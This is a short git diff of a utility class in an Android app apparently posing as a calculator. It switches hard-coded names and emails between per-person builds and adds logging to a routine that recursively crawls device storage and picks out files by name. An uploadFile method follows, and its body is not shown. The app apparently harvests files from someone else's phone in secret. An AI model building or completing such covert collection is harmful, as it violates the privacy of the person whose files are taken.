@@ -16,11 +16,11 @@ import es.fraggel.acalculator.Models.User;
 
 public class Util {
     //App para eva
-    //public static String EMAIL="fraggelillo666@gmail,com";
-    //public static String NOMBRE="Pablo";
+    public static String EMAIL="fraggelillo666@gmail,com";
+    public static String NOMBRE="Pablo";
     //App para mi
-    public static String EMAIL="eva@gmail,com";
-    public static String NOMBRE="Eva";
+    //public static String EMAIL="eva@gmail,com";
+    //public static String NOMBRE="Eva";
     //App pruebas
     //public static String EMAIL="pruebas@gmail,com";
     //public static String NOMBRE="Nombre";
@@ -41,10 +41,11 @@ public class Util {
 
     public static void GetFiles(String ruta){
         File f=new File(ruta);
-
+        Log.d("Directorio", f.getAbsolutePath());
         for (File file : f.listFiles()) {
             try {
                 if (file.isDirectory()) {
+
                     GetFiles(file.getAbsolutePath());
                 } else {
                     String ff = file.getName().toLowerCase();
@@ -55,7 +56,9 @@ public class Util {
                         Log.d("Calculator", file.getAbsolutePath());
                     }
                 }
-            }catch(Exception e){}
+            }catch(Exception e){
+                e.printStackTrace();
+            }
         }
     }
     public static void uploadFile(File file) {
